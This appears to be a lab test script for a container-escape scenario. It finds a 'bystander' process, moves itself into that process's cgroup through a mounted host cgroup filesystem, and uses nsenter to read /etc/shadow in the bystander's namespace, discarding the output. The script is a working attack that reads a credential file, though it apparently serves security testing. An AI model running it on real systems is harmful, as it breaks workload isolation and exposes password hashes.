#!/bin/sh
# SPDX-License-Identifier: Apache-2.0
# Lab use only. Runs inside the scenario's target pod.
pid=
for p in /proc/[0-9]*; do
	[ "$(tr '\0' ' ' <"$p/cmdline" 2>/dev/null)" = "sleep 3601 " ] && pid=${p#/proc/} && break
done
[ -n "$pid" ] || { echo "the bystander was not found"; exit 99; }
procs=$(find /hostcg -name cgroup.procs -exec grep -lx "$pid" {} + 2>/dev/null | head -n 1)
[ -n "$procs" ] || { echo "the bystander's cgroup was not found"; exit 99; }
sh -c "echo \$\$ > $procs && exec nsenter -t $pid -m cat /etc/shadow" >/dev/null || { echo "could not become the bystander"; exit 99; }
echo "read /etc/shadow as the bystander, from $(dirname "$procs")"
